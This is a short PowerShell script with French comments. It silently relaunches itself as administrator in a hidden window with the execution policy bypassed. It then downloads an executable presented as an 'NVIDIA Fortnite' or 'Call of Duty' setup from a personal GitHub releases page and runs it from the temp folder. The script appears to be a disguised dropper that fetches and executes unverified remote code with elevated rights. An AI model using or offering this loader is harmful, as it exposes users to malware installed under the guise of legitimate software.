# Auto-elevation en admin rapide
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process PowerShell -Verb RunAs "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`" $args"
    exit
}

# Desactiver la barre de progression pour plus de rapidite
$ProgressPreference = 'SilentlyContinue'

# Code principal (execute en admin)
switch ($args[0]) {
    "-nvidia" {
        Write-Host "Telechargement du setup NVIDIA Fortnite..." -ForegroundColor Cyan
        (New-Object System.Net.WebClient).DownloadFile("https://github.com/Baba75020/NVIDIA/releases/download/V1/NVIDIA.exe", "$env:TEMP\NVIDIA.exe")
        Write-Host "Lancement de NVIDIA.exe..." -ForegroundColor Green
        & "$env:TEMP\NVIDIA.exe"
    }
    "-callofduty" {
        Write-Host "Telechargement du setup Call of Duty..." -ForegroundColor Cyan
        (New-Object System.Net.WebClient).DownloadFile("https://github.com/Baba75020/Callofduty/releases/download/V1/Callofduty.exe", "$env:TEMP\Callofduty.exe")
        Write-Host "Lancement de Callofduty.exe..." -ForegroundColor Green
        & "$env:TEMP\Callofduty.exe"
    }
    default {
        Write-Host "Usage: .\NVIDIA.ps1 -nvidia | -callofduty" -ForegroundColor Yellow
    }
}
